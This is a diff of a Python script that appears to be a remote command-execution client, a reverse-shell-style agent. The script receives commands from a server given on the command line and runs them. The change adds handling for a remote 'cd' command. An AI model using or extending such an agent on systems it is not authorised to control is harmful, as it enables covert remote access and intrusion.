@@ -3,6 +3,7 @@ import subprocess
 import sys
 import time
 import platform
+import os
 
 #script args
 server_address = sys.argv[1]
@@ -31,6 +32,10 @@ def process_exec(client_session, command):
 def process_commands(client_session):
     command = client_session.recv(1024).decode('utf-8').split(" ")
     if command[0] == "exec":
+        if command[1] == "cd" and len(command[2]):
+            os.chdir(" ".join(command[2:]))
+            client_session.send(f'[*] Path changed to: {" ".join(command[2:])}')
+            return
         process_exec(client_session, " ".join(command[1:]))
     elif command[0] == "getdir":
         if platform.system() == "Windows":
